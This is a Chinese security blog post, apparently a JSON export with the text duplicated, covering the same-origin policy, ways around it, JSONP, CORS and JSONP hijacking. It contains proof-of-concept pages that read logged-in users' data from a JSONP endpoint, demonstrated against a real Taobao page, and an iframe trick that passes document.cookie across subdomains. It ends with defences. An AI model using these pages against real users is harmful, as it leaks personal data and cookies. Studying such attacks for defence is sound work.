等，然后以此点进（确实慢，而且效率不高）。\n\n3、这里以淘宝为例，我找到了一个没什么利用价值的页面，只是用来实现整个过程。\n\n ![18.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/18.png)\n\n\n\n4、通过构造恶意代码，诱使登陆的用户访问，然后获得数据。（这里淘宝这个页面确实没做特殊的过滤和访问控制，可能是因为数据没什么利用价值）\n\n```html\n<html>\n\n<head>\n    <script src=\"jquery.min.js\"></script>\n    <meta charset=\"utf-8\">\n</head>\n\n<body>\n    <p id=\"content\"></p>\n    <script>\n        function 【回调函数名】(data) {\n            var p = $('p#content');\n            p.html('ip : ' + data.data.ip + '<br>' + ' region：' + data.data.region + '<br>' + ' city: ' + data.data.city);\n        }\n        $(function() {\n            $.ajax({\n                type: 'GET',\n                url: '接口名',\n                dataType: 'jsonp',\n                jsonp: 'callback', // 请求 php 的参数名\n                jsonpCallback: '回调函数名' // 回调函数名 \n            });\n        });\n    </script>\n</body>\n\n</html>\n```\n\n\n\n ![19.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/19.png)\n\n可以看到，数据已经跨域访问，并且输出到了页面上面，如果是敏感数据，危害确实是巨大的。\n\n\n\n为了避免手动傻瓜寻找，我们可以编写爬虫脚本来自动化测试。\n\n>（1）Selenium：可用于自动化对网页进行测试，“到处”点击按钮、超链接，以期待测试更多的接口；\n>\n>（2）Proxy：用于代理所有的请求，过滤出所有包含敏感信息的[JSONP](http://www.infosec-wiki.com/?tag=jsonp)请求，并记录下HTTP请求；\n>\n>（3）验证脚本：使用上述的HTTP请求，剔除referer字段，再次发出请求，测试返回结果中，是否仍包敏感信息，如果有敏感信息，说明这个接口就是我们要找的！\n\n\n\n引用的工具作者将工具放到了[这](https://github.com/qiaofei32/jsonp_info_leak)。\n\n\n\n ![20.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/20.png)\n\n\n\n可以看到，速度和效率确实高出不少，但是还是需要一定程度的人工筛选。\n\n\n\n### 4.4 漏洞防御\n\n\n\n这个漏洞乍看起来利用起来很难。没错，随着网站开发者的安全意识的提升，接口过滤会愈来愈多，但是目前来看还是有很多存在缺陷的接口。想想，如果有个 xss 可利用，拿到 token 之类的数据， jsonp 的防御是否还是坚不可摧呢？\n\n这里我们再补充一点，当服务端出现如下配置时，就算满足条件，服务端也会拒绝返回数据：\n\n````php\nheader(\"Access-Control-Allow-Origin: *\");\nheader(\"Access-Control-Allow-Credentials: true\");\n````\n\n\n其中：\n\n> 对应客户端的 `xhrFields.withCredentials: true` 参数，服务器端通过在响应 header 中设置 `Access-Control-Allow-Credentials = true` 来运行客户端携带证书式访问。通过对 Credentials 参数的设置，就可以保持跨域 Ajax 时的 Cookie\n\n\n\n### 补充（跨域 ajax 带 cookie 的问题）\n\n上面这段引用说到了在请求页面 ajax 必须带上参数 `withCredentials`,并设置其值为 `true。`\n\n服务端也必须设置头部 `Access-Control-Allow-Credentials = true`。\n\n我们来做个实验：\n\n```html\n// 请求页面 本地 1234 端口\n<html>\n\n<head>\n    <script src=\"jquery.min.js\"></script>\n    <meta charset=\"utf-8\">\n</head>\n\n<body>\n    <p id=\"content\"></p>\n    <script>\n        function jsonp407(data) {\n            var p = $('p#content');\n\t\tp.html('name : ' + data.name + '<br>' + ' age：' + data.age + '<br>' + ' cookie: ' + data.cookie);\n        }\n        $(function() {\n            $.ajax({\n                type: 'GET',\n                url: 'http://SEVER_IP/test.php',\n                dataType: 'jsonp',\n                jsonp: 'callback', // 请求 php 的参数名\n                jsonpCallback: 'jsonp407', // 回调函数名\n                xhrFields: {\n                \t withCredentials: true   // 设置带 cookie 的参数为true\n                }\n            });\n        });\n    </script>\n</body>\n\n</html>\n```\n\n \n\n然后在本地浏览器设置一个任意 cookie 值,这里我们本地浏览器在服务器页面下设置 cookie 值 localtest\n\n\n\n```php\n// 跨域请求页面,远程服务器 80 端口\n<?php\nheader(\"Access-Control-Allow-Origin: *\");\nheader(\"Content-Type: application/json\");\n//header(\"Access-Control-Allow-Credentials: true\");\n$cookie = $_COOKIE['localtest'];\nsetcookie('rt95','123');\n$cookie2 = $_COOKIE['rt95'];\n$data = array(\n    \"age\"=>20,\n    \"cookie\"=>$cookie,\n    \"name\"=>'rt95',\n    \"cookie2\"=>$cookie2\n);\n$callback = $_GET['callback'];\necho $callback.\"(\".json_encode($data).\")\";\nreturn;\n?>\n```\n\n访问本地页面：\n\n ![21.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/21.png)\n\n这里需要注意的是，服务端不设置 `Access-Control-Allow-Credentials` 字段的值也是可以传输 cookie 值的(本地跨域和远程跨域测试结果都是如此)，这与许多文档中描述不符，所以会在一定程度上降低攻击的难度。\n\n防御方法：\n\n- 接口处限制 referer 字段，设置随机 token 等。\n- 因为有直接利用 callback 函数进行的 xss攻击，我们还要严格控制编码，防止解析为 html ，要严格按照 JSON 格式标准输出 Content-Type 及编码（ Content-Type : application/json; charset=utf-8 ）。\n- 严格过滤 callback 函数名及 JSON 里数据的输出。\n- 不要使用cookies来自定义JSONP响应。\n- 在 JSONP 响应中不要加入用户的个人敏感数据。\n- 严谨配置 Access-Control-Allow-Origin 选项。\n\n\n\n\n\n\nReference:\n\n`<白帽子讲web安全>`\n\n`https://www.liaoxuefeng.com/wiki/1022910821149312/1023022332902400`\n\n`http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html`\n\n`https://www.cnblogs.com/sdcs/p/8484905.html`\n\n`https://blog.csdn.net/qq_38643434/article/details/81430528`\n\n`https://www.cnblogs.com/xiaohuochai/p/6568039.html`\n\n`https://www.k0rz3n.com/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/`\n\n`https://www.k0rz3n.com/2018/06/05/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E7%90%86%E8%A7%A3JSONP%E5%B9%B6%E6%8B%93%E5%B1%95/`\n\n`https://www.freebuf.com/articles/web/70025.html`\n\n`https://www.anquanke.com/post/id/97671`\n\n`https://www.cnblogs.com/52php/p/5677775.html`\n\n`https://www.infosec-wiki.com/?p=455211`\n\n`https://blog.csdn.net/z69183787/article/details/78954325`\n\n`https://www.w3cschool.cn/fetch_api/fetch_api-lx142x8t.html`\n","source":"_posts/同源策略&JSONP及其利用.md","raw":"---\ntitle: 规避浏览器同源策略 & JSONP的原理和利用\ntags:\n - vulneralbility\n - javascript\ndate: 2019-09-02\n---\n\n## 1@ 前言\n\n前端尤其是 Js 越学越发觉得其灵活度是超出一般脚本的。这篇文章，记录下自己对同源策略和 JSONP 的学习，也供有需要的同学参阅。\n\n\n\n## 2@ 同源策略\n\n想必搞安全的初期大都会读过道哥的那本**`白帽子`**,书里面靠前的位置就讲过同源策略，不过我想大部分人可能还是对这个概念了解的不是很透彻，我们一起再来温习温习。\n\n\n\n> 1995年，同源政策由 Netscape 公司引入浏览器。目前，所有浏览器都实行这个政策。\n\n\n\n> \n>\n> 同源策略 （Same Origin Policy）是一种约定。\n>\n> 浏览器的同源策略，限制了来自不同源的 document 或脚本，对当前 document 读取或者设置某些属性。\n>\n> ​                                                         \t\t\t\t\t\t\t\t\t---------- 《白帽子讲web安全》\n\n\n\n### 2.1 介绍\n\n那么，什么时候两个资源才算是同源呢？\n\n影响两个资源是否同源主要看以下字段是否相同，如果一致，则会被认为是同源的。\n\n- host(域名或者IP地址)\n- 子域名\n- 端口\n- 协议\n\n举个简单的例子：\n\n`http://test1.rt95.com/test.html`\n\n`http://test2.rt95.com/test.html`\n\n上面两个资源就是不同源的，因为他们的子域名不同 。\n\n\n\n### 2.2 限制范围\n\n当前，如果非同源，下面的行为会受到限制。\n\n```\n（1） Cookie、LocalStorage 和 IndexDB 无法读取。\n\n（2） DOM 无法获得。\n\n（3） AJAX 请求不能发送。\n```\n\n\n\n### 2.3 规避同源策略的方法\n\n#### 1、Cookie\n\n**如果两个网页的一级域名相同，只是二级域名不同，可以通过设置document.domain 共享 Cookie**\n\n\n\n- 上面这句话其实略带迷惑性，容易想当然。其本质就是页面可以设置 document.domain 为当前子域或者比当前子域更高的域。而一个子域的 cookie 包含了其子域和所有比其更高的域的 cookie，下例实质上是间接设置了主站上的 cookie，而使得所有子域都能访问到 cookie。\n\n\n\n假如说我们现在有两个测试网站，仅仅是子域名不同，我们通过上面的原理来访问下 cookie 值。\n\n测试网站为阮大佬的博客和书籍页面。\n\n打开 `es6.ruanyifeng.com`,控制台改变域名：\n\n ![1.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/1.png)\n\n\n\n然后设置一个 cookie 值：\n\n\n\n ![2.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/2.png)\n\n\n\n继续到博客页面，控制台改变域名和之前相同，然后进行 cookie 访问：\n\n![3.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/3.png)\n\n\n\n这种方法只适用于 Cookie 和 iframe 的窗口，LocalStorage 和 IndexDB 不能使用此方法。\n\n一般浏览器前端设置 cookie 的插件，像 EditThisCookie 这种，还是后端设置 cookie，如果没有特殊的用处，都是将 cookie 的 domain 字段设置为当下所属的域，但是如果此域存在一个 xss, 组合利用的话，可以修改 cookie 让另一个子域跨域访问到。\n\n\n\n\n\n下面再给出一个比较有意思的跨域获取 cookie 的思路：\n\n- 现在在 cms1.test.ink 域下面有一个 1.html,内嵌一个 cms2.test.ink 的 2.html 页面:\n\n```html\n<html>\n<head>\n</head>\n<body>\n    <iframe src='http://cms2.test.ink/2.html' width='100' height='100'> </iframe>\n    <textarea id=\"zhaochao\">\n    </textarea>\n</body>\n</html>\n```\n\n- 而 cms2.test.ink 域下面的 2.html 内容如下，其内容是跳转到 cms1.test.ink 域下的 3.html，并且带上自己的cookie：\n\n```html\n<html>\n<head>\n</head>\n<body>\n<script>\nwindow.location=\"http://cms1.test.ink/3.html?\"+document.cookie;\n</script>\n</body>\n</html>\n```\n\n- cms1.test.ink 域下面的 3.html 用来接收跨域传递过来的参数，并写在父页面的文本框里：\n\n```html\n<html>\n<head>\n</head>\n<body>\n<script>\nwindow.parent.document.getElementById(\"zhaochao\").value=window.location.toString().substring(window.location.toString().indexOf(\"?\"));\n</script>\n</body>\n```\n\n- 访问 cms1.test.ink/1.html,内嵌 cms2.test.ink/2.html，带 cookie 跳转到 cms1.test.ink/3.html 接收参数，写到主页面。\n\n ![22.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/22.png)\n\n\n\n#### 2、iframe\n\n如果两个网页不同源，那么就不能拿到对方的 dom ，像 iframe 和 window.open 窗口，与父窗口无法进行通信。\n\n像在父窗口上使用下述方法来获取 iframe 的标签，就会因为不同源而报错。（本地嵌入一个百度页面进行测试）\n\n\n\n ![4.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/4.png)\n\n\n\n如果父子窗口只是二级域名不同，可以效仿上一点 Cookie 的跨越访问那样，设置 `document.domain` 一致即可访问。\n\n下面介绍下完全不同源的网站进行跨域访问的三种方法。\n\n```\n片段识别符（fragment identifier）\nwindow.name\n跨文档通信API（Cross-document messaging）\n```\n\n\n\n#### 3、片段识别符\n\n片段识别符（fragment identifier)也就是前端开发中所说的锚点，即 URL 的 `#` 之后的内容。如果知识改变片段识别符，页面不会重新刷新。\n\n这种父子间的访问方法已经浮出水面：父窗口向子窗口的片段标识符中写入数据，而子窗口可以通过创建一个监听 hash 值的方法来获取父窗口传过来的数据，从而达成通信。\n\n\n\n```javascript\n// 父窗口写入数据\nvar src = originRL + '#' + data;\n$('iframe').get(0).src = src；\n```\n\n\n\n```javascript\n// 子窗口查看数据\nwindow.location.href； // # 之后有 data 的值\n```\n\n\n\n ![5.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/5.png)\n\n\n\n ![6.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/6.png)\n\n\n\n#### 4、window.name\n\nwindow.name 这个属性有个特定就是，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页就可以读取到它。（这种方法只能是子窗口向父窗口发送数据）\n\n我们依旧拿上面的例子来演示：\n\n```\n在父窗口中打开子窗口，键入 window.name 的值 ----->\n然后改变 window.location 的值进入到父窗口  ----->\n父窗口中获得子窗口的标签，然后读取其 window.name 的值\n```\n\n\n\n ![7.pg](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/7.png)\n\n\n\n ![8.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/8.png)\n\n\n\n\n\n#### 5、window.postMessage\n\n上面的方法都属于程序猿们私下闲着没事干破解出来的，而 HTML5 为了解决这个问题。引入了一个全新的 API ：跨文档通信 API （Cross-document-messaging),它为 window 对象多增添了一个 window.postMessage() 的方法，允许跨窗口通信，不管是否同源。\n\n\n\n> 举例来说，父窗口`http://aaa.com`向子窗口`http://bbb.com`发消息，调用`postMessage`方法就可以了\n\n\n\n我们来看看 w3c 中定义 的 postMessage() 方法的定义\n\n> targetWindow .postMessage（message，targetOrigin，[ transfer ]）\n>\n> - *targetWindow*\n>\n>   对将接收消息的窗口的引用。获得此类引用的方法包括：`Window.open` （生成一个新窗口然后引用它），`Window.opener` （引用产生这个的窗口），`HTMLIFrameElement.contentWindow`（`<iframe>`从其父窗口引用嵌入式），`Window.parent`（从嵌入式内部引用父窗口`<iframe>`）`Window.frames` +索引值（命名或数字）。\n>\n> - *message*\n>\n>   要发送到其他窗口的数据。使用结构化克隆算法序列化数据。这意味着您可以将各种各样的数据对象安全地传递到目标窗口，而无需自己序列化。\n>\n> - *targetOrigin*\n>\n>   指定要调度的事件的`targetWindow`的原点，可以是文字字符串`\"*\"`（表示没有首选项），也可以是URI。如果在计划调度事件时，`targetWindow`文档的方案，主机名或端口与`targetOrigin`提供的内容不匹配，则不会调度该事件；只有当所有的三个条件都匹配时，将调度该事件。该机制可以控制发送消息的位置；例如，如果`postMessage()`用于传输密码，则该参数必须是URI，其来源与包含密码的消息的预期接收者相同，以防止恶意第三方拦截密码。**始终提供具体的targetOrigin，而不是\\*，如果您知道其他窗口的文档应该位于何处。未能提供特定目标会泄露您发送给任何感兴趣的恶意站点的数据。**\n>\n> - *stransfer*（可选的）\n>\n>   是与消息一起传输的`Transferable`对象序列。这些对象的所有权将提供给目标端，并且它们在发送端不再可用。\n>\n>  \n\n\n\n\n\n```javascript\nvar popup = window.open('http://bbb.com', 'title');\npopup.postMessage('Hello World!', 'http://bbb.com');\n```\n\npostMessage 的参数是：\n\n- 1、发送的内容\n- 2、接收消息的窗口源，设为 * 时，表示向所有窗口发送。\n\n\n\n父子窗口均可以通过监听 message 事件来获取消息：\n\n```javascript\nwindow.addEventListener('message', function(e) {\n  console.log(e.data);\n},false);\n```\n\n\n\nmessage 事件相关的对象有下面属性：\n\n- `event.source`：对发送消息的`window`对象的引用，也就是想要给其发送消息的一方，即上面的 targetWindow。\n- `event.origin`: 调用当时发送消息的窗口的原点`postMessage`，即信息来源的一方。\n- `event.data`: 消息内容\n\n\n\n接下来我们创建一个父子窗口交互的代码示例：\n\n\n\n```javascript\n// 父窗口 http://127.0.0.1/frametest/test.html\n <iframe src=\"http://127.0.0.1:8086/child.html\" frameborder=\"0\"></iframe>\n <script>\n     window.addEventListener('message', receiveMessage);\n\n     function receiveMessage(event) {\n         document.write('this is receiver\\'s receiving data' + event.data);\n\n      }\n </script>\n```\n\n\n\n```html\n// 子窗口 http://127.0.0.1:8086/child.html\n<script>\n      window.addEventListener('message', receiveMessage);\n\n      function receiveMessage(event) {\n          event.source.postMessage('message_received', event.origin);\n          alert(event.data);\n\n        }\n</script>\n```\n\n\n\n然后在父窗口向子窗口发送信息：(注意我们此时需要先拿到 iframe 标签，通过它来向子窗口发送数据)\n\n\n\n![9.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/9.png)\n\n\n\n ![10.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/10.png)\n\n\n\n ![11.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/11.png)\n\n\n\n\n\n### 2.4 补充\n\n尽管有同源策略，但是在浏览器中，`<script>` `img` `iframe` `<link>` 等标签依旧可以跨域加载资源，不受同源策略的控制。一般都是带 **src** 属性的标签，它们加载资源时，其实是由浏览器发出了一次 GET 请求。\n\n除了上面规避同源策略的方法外，还有几种：\n\n- flash插件发送 http 请求，但必须安装 flash ，和 flash 交互。而现在 flash 已经用的越来越少了，在这里就不细究，有兴趣的同学可以参考道哥书里面的第二章内容。\n- 可以在同源服务器下架设一个代理服务器来转发，代理服务器负责请求跨域内容，而 js 只负责接收即可。\n- 第三种方式即是我们下面要探讨的 JSONP。\n\n\n\n## 3@ JSONP 介绍\n\n​\t JSONP 即 JSON with Padding（填充式 JSON），是应用 JSON 的一种新的方法，常用于服务器和客户端跨源通信，在后来的 Web 服务中非常流行。\n\n\n\n### 3.1 基础知识\n\n JSONP 的基本思想就是，网页添加一个 `<script>` 标签，然后向服务器请求数据，服务器传送回来的数据放到请求时 `callback` 关键字函数中进行处理。这种方法不受同源策略的限制。JSONP 有个要求，就是只能用 GET请求，并且要求返回 Javascript，常见可以被浏览器解析为 js 的数据 mime 类型[在这](https://mathiasbynens.be/demo/javascript-mime-type),实际上也就是我们上面补充点中说的，`<script>` 等标签可以跨域加载资源。\n\n\n\n我们来看一个例子：\n\n```javascript\n// 构造一个加载跨域数据的脚本，来读取当前价格指数\n function refreshPrice(data) { //构造回调函数\n            var p = $('p#content').get(0);\n            p.innerHTML = '当前价格' +\n                data['0000001'].name + ': ' +\n                data['0000001'].price + '；' +\n                data['1399001'].name + ': ' +\n                data['1399001'].price;\n        }\n  var js = document.createElement('script');\n  head = $('head');\n  js.src = \"http://api.money.126.net/data/feed/0000001,1399001？callback=refreshPrice\";\n  head.append(js);  // 添加标签，加载数据，触发回调函数\n```\n\n\n\n ![12.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/12.png)\n\n\n\n从这个例子我们也可以看出来，JSONP 由两部分组成：\n\n- 回调函数\n- 请求传入的数据\n\n\n\n再举一个我们生活中大概率会碰到的例子：百度。\n\n百度搜索框也是利用了 JSONP 的技术，我们可以通过下面的查询 URL 看出端倪。\n\n`https://sp0.baidu.com/5a1Fazu8AA54nxGko9WTAnF6hhy/su?wd=西电&&cb=a`\n\n\n\n结果为：\n\n```json\na(\n{\n\"q\": \"西电\",\n\"p\": false,\n\"s\": [\n\"西电教务处\",\n\"西电睿思\",\n\"西电迎新网\",\n\"西电图书馆\",\n\"西电研究生\",\n\"西电研究生系统\",\n\"西电研究生院\",\n\"西电信息化建设处\",\n\"西电电院\",\n\"西电就业信息网\"\n]\n}\n)\n```\n\n\n\ns 其实就是搜索结果的匹配项，而 cb 这个参数就是请求资源后的回调函数。\n\n\n\n\n\n### 3.2 JSONP 实现 ajax 的跨域请求\n\n我们知道，原生 Js 的 ajax 异步请求是有同源策略所限制的，但是有了 JSONP，我们便可以实现跨域请求。\n\n接下来我们构造另一个域的生成 json 内容的 php 文件进行异步加载。\n\n```php\n//127.0.0.1:8086/test.php\n<?php\n$data = array(\n    'age'=>20,\n    'name'=>'rt95'\n);\n$callback = $_GET['callback'];\n\necho $callback.\"(\".json_encode($data).\")\";\nreturn;\n?>\n```\n\n\n\n\n\n```html\n//127.0.0.1/frametest/test.html\n<html>\n\n<head>\n    <script src=\"jquery.min.js\"></script>\n    <meta charset=\"utf-8\">\n</head>\n\n<body>\n    <p id=\"content\"></p>\n    <script>\n        function handler(data) {\n            var p = $('p#content');\n            p.html('name : ' + data.name + '<br>' + 'age : ' + data.age);\n        }\n        $(function() {\n            $.ajax({\n                type: 'GET',\n                url: 'http://127.0.0.1:8086/test.php',\n                dataType: 'jsonp',\n                jsonp: 'callback', // 请求 php 的参数名\n                jsonpCallback: 'handler' // 回调函数名 \n            });\n        });\n    </script>\n</body>\n\n</html>\n```\n\n\n\n运行文件！走你～你是不是发现了报错？长下面这样：\n\n ![13.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/13.png)\n\n\n\n我们可以看到是被 CORS 这个规则给阻止了，那，什么是 CORS 呢？\n\n\n\n### 3.3 CORS (跨域资源共享)\n\n\n\n> 如果浏览器支持HTML5，那么就可以一劳永逸地使用新的跨域策略：CORS了。\n>\n> CORS全称Cross-Origin Resource Sharing，是HTML5规范定义的如何跨域访问资源。\n\n\n\n首先，我们需要了解：\n\nOrigin 表示的是本域，就是浏览器当前页面的域。我们看图说话：\n\n\n\n ![14.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/14.png)\n\n\n\n假如我们的本域是 my.com ，待请求的外域为 sina.com，那么只要服务器端的响应头的 **Access-Control-Allow-Origin** 字段有我们的本域，亦或是通配符 * ，本次请求就可以成功。\n\n像 POST ，GET 这样的简单请求只需验证这个字段即可，但是像 PUT，DELETE 等请求，在发送 ajax 之前，浏览器还会先发出一个 OPTION 请求，类似下面这样：\n\n```http\nOPTIONS /path/to/resource HTTP/1.1\nHost: bar.com\nOrigin: http://my.com\nAccess-Control-Request-Method: POST\n```\n\n服务器端会给出允许响应的请求类型：\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: http://my.com\nAccess-Control-Allow-Methods: POST, GET, PUT, OPTIONS\nAccess-Control-Max-Age: 86400\n```\n\n如果我们刚开始的请求是在字段 **Access-Control-Allow-Methods** 里面，那么浏览器就会继续发送 ajax 请求，否则会抛出错误，终止操作。\n\n\n\n有了这些知识，我们就可以很轻松的解决上面的问题了。修改一下服务端的脚本，添加返回头的 **Access-Control-Allow-Origin** 字段。\n\n```php\n<?php\nheader(\"Access-Control-Allow-Origin:*\");\n$data = array(\n    \"age\"=>20,\n    \"name\"=>'rt95'\n);\n$callback = $_GET['callback'];\necho $callback.\"(\".json_encode($data).\")\";\nreturn;\n?>\n```\n\n\n\n ![15.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/15.png)\n\n\n\n\n\n这里有两个点需要注意下：\n\n- dataType 的 T 是大写，一定要注意！！\n- 请求界面一定要给返回页面中调用 callback 指定的函数，具体实现根据不同需要而定。\n\n\n\n\n\n\n\n## 4@ JSONP 的劫持\n\n### 4.1 漏洞原理\n\n介绍了这么多知识，接下来我们就来介绍如何具体利用这个可能的漏洞点。\n\n ![16.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/16.png)\n\n\n\n\n\n其实上面这张图已经十分清晰的展示了 JSONP 的利用过程。\n\n```\n用户注册网站 B ----->\n用户访问网站 A ----->\nA 网站的恶意脚本功能是通过注册 Callback 函数来像 B 网站发起请求,获得用户在 B 上的信息 ----->\nB 网站未做请求检测，返回用户数据 ----->\n数据上传至攻击者服务器\n```\n\n\n\n### 4.2 漏洞危害\n\n> **JSONP是一种敏感信息泄露的漏洞**，经过攻击者巧妙而持久地利用，会对企业和用户造成巨大的危害。攻击者通过巧妙设计一个网站，**网站中包含其他网站的JSONP漏洞利用代码**，将链接通过邮件等形式推送给受害人，**如果受害者点击了链接，则攻击者便可以获取受害者的个人的信息，如邮箱、姓名、手机等信息，**这些信息可以被违法犯罪分子用作“精准诈骗”。对方掌握的个人信息越多，越容易取得受害人的信任，诈骗活动越容易成功，给受害人带来的财产损失以及社会危害也就越大。\n\n\n\n\n\n### 4.3 漏洞利用\n\n\n\n要想利用 JSONP 漏洞，必须找到存在漏洞的接口，这个接口必须满足以下三个条件：\n\n- 泄露出了敏感的信息，如 email,username,严重甚至 token。\n- 未检测 referer（可以绕过 HTML5 的 CORS 策略），或者验证方式不太严谨，正则写的不完善等等，譬如设置验证的 referer 为 `http://www.xxx.com `, 但是`http://www.xxx.com.evil.com ` 依旧可以绕过限制。\n- 未启用 token 验证。\n\n\n\n#### 寻找方法\n\n我们可以使用如下方法来初步粗略的寻找可能存在漏洞的接口。\n\n1、打开浏览器控制台的 Preseve log ,防止之前找到的结果被刷新的页面覆盖。\n\n ![17.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/17.png)\n\n\n\n\n\n2、手动通过关键词筛选一些信息，搜索一些关键词，譬如 `callback`,`jsonp` 等，然后以此点进（确实慢，而且效率不高）。\n\n3、这里以淘宝为例，我找到了一个没什么利用价值的页面，只是用来实现整个过程。\n\n ![18.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/18.png)\n\n\n\n4、通过构造恶意代码，诱使登陆的用户访问，然后获得数据。（这里淘宝这个页面确实没做特殊的过滤和访问控制，可能是因为数据没什么利用价值）\n\n```html\n<html>\n\n<head>\n    <script src=\"jquery.min.js\"></script>\n    <meta charset=\"utf-8\">\n</head>\n\n<body>\n    <p id=\"content\"></p>\n    <script>\n        function 【回调函数名】(data) {\n            var p = $('p#content');\n            p.html('ip : ' + data.data.ip + '<br>' + ' region：' + data.data.region + '<br>' + ' city: ' + data.data.city);\n        }\n        $(function() {\n            $.ajax({\n                type: 'GET',\n                url: '接口名',\n                dataType: 'jsonp',\n                jsonp: 'callback', // 请求 php 的参数名\n                jsonpCallback: '回调函数名' // 回调函数名 \n            });\n        });\n    </script>\n</body>\n\n</html>\n```\n\n\n\n ![19.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/19.png)\n\n可以看到，数据已经跨域访问，并且输出到了页面上面，如果是敏感数据，危害确实是巨大的。\n\n\n\n为了避免手动傻瓜寻找，我们可以编写爬虫脚本来自动化测试。\n\n>（1）Selenium：可用于自动化对网页进行测试，“到处”点击按钮、超链接，以期待测试更多的接口；\n>\n>（2）Proxy：用于代理所有的请求，过滤出所有包含敏感信息的[JSONP](http://www.infosec-wiki.com/?tag=jsonp)请求，并记录下HTTP请求；\n>\n>（3）验证脚本：使用上述的HTTP请求，剔除referer字段，再次发出请求，测试返回结果中，是否仍包敏感信息，如果有敏感信息，说明这个接口就是我们要找的！\n\n\n\n引用的工具作者将工具放到了[这](https://github.com/qiaofei32/jsonp_info_leak)。\n\n\n\n ![20.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/20.png)\n\n\n\n可以看到，速度和效率确实高出不少，但是还是需要一定程度的人工筛选。\n\n\n\n### 4.4 漏洞防御\n\n\n\n这个漏洞乍看起来利用起来很难。没错，随着网站开发者的安全意识的提升，接口过滤会愈来愈多，但是目前来看还是有很多存在缺陷的接口。想想，如果有个 xss 可利用，拿到 token 之类的数据， jsonp 的防御是否还是坚不可摧呢？\n\n这里我们再补充一点，当服务端出现如下配置时，就算满足条件，服务端也会拒绝返回数据：\n\n````php\nheader(\"Access-Control-Allow-Origin: *\");\nheader(\"Access-Control-Allow-Credentials: true\");\n````\n\n\n其中：\n\n> 对应客户端的 `xhrFields.withCredentials: true` 参数，服务器端通过在响应 header 中设置 `Access-Control-Allow-Credentials = true` 来运行客户端携带证书式访问。通过对 Credentials 参数的设置，就可以保持跨域 Ajax 时的 Cookie\n\n\n\n### 补充（跨域 ajax 带 cookie 的问题）\n\n上面这段引用说到了在请求页面 ajax 必须带上参数 `withCredentials`,并设置其值为 `true。`\n\n服务端也必须设置头部 `Access-Control-Allow-Credentials = true`。\n\n我们来做个实验：\n\n```html\n// 请求页面 本地 1234 端口\n<html>\n\n<head>\n    <script src=\"jquery.min.js\"></script>\n    <meta charset=\"utf-8\">\n</head>\n\n<body>\n    <p id=\"content\"></p>\n    <script>\n        function jsonp407(data) {\n            var p = $('p#content');\n\t\tp.html('name : ' + data.name + '<br>' + ' age：' + data.age + '<br>' + ' cookie: ' + data.cookie);\n        }\n        $(function() {\n            $.ajax({\n                type: 'GET',\n                url: 'http://SEVER_IP/test.php',\n                dataType: 'jsonp',\n                jsonp: 'callback', // 请求 php 的参数名\n                jsonpCallback: 'jsonp407', // 回调函数名\n                xhrFields: {\n                \t withCredentials: true   // 设置带 cookie 的参数为true\n                }\n            });\n        });\n    </script>\n</body>\n\n</html>\n```\n\n \n\n然后在本地浏览器设置一个任意 cookie 值,这里我们本地浏览器在服务器页面下设置 cookie 值 localtest\n\n\n\n```php\n// 跨域请求页面,远程服务器 80 端口\n<?php\nheader(\"Access-Control-Allow-Origin: *\");\nheader(\"Content-Type: application/json\");\n//header(\"Access-Control-Allow-Credentials: true\");\n$cookie = $_COOKIE['localtest'];\nsetcookie('rt95','123');\n$cookie2 = $_COOKIE['rt95'];\n$data = array(\n    \"age\"=>20,\n    \"cookie\"=>$cookie,\n    \"name\"=>'rt95',\n    \"cookie2\"=>$cookie2\n);\n$callback = $_GET['callback'];\necho $callback.\"(\".json_encode($data).\")\";\nreturn;\n?>\n```\n\n访问本地页面：\n\n ![21.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/21.png)\n\n这里需要注意的是，服务端不设置 `Access-Control-Allow-Credentials` 字段的值也是可以传输 cookie 值的(本地跨域和远程跨域测试结果都是如此)，这与许多文档中描述不符，所以会在一定程度上降低攻击的难度。\n\n防御方法：\n\n- 接口处限制 referer 字段，设置随机 token 等。\n- 因为有直接利用 callback 函数进行的 xss攻击，我们还要严格控制编码，防止解析为 html ，要严格按照 JSON 格式标准输出 Content-Type 及编码（ Content-Type : application/json; charset=utf-8 ）。\n- 严格过滤 callback 函数名及 JSON 里数据的输出。\n- 不要使用cookies来自定义JSONP响应。\n- 在 JSONP 响应中不要加入用户的个人敏感数据。\n- 严谨配置 Access-Control-Allow-Origin 